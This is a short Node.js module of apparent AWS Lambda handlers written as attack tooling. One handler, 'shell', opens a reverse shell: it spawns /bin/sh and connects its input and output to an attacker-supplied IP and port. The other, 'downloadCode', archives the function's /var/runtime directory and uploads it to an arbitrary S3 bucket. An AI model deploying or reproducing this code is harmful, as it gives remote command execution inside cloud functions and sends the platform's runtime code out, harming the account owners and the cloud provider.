'use strict'
const net = require('net');
const cp = require('child_process');
const fs = require('fs');
const AWS = require('aws-sdk');

module.exports.shell = function shell(event, context, callback) {
    const sh = cp.spawn('/bin/sh', []);
    const client = new net.Socket();
    client.connect(event['port'], event['ip'], () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    callback(null, 'OK');
    return 'OK';
}

module.exports.downloadCode = function downloadCode(event, context, callback) {
    const s3Client = new AWS.S3();
    cp.exec(
        '/bin/tar -zcvf /tmp/code.tar.gz /var/runtime',
        {},
        () => {
            fs.readFile('/tmp/code.tar.gz', (err, data) => {
                if (err) {
                    throw err;
                }
                const params = {
                    Bucket: event['bucket'],
                    Key: event['key'],
                    Body: data
                };
                s3Client.putObject(params, (err, data) => {
                    if (err) {
                        console.log(err);
                    } else {
                        console.log('Uploaded the runtime');
                    }
                });
            });
        }
    )
}
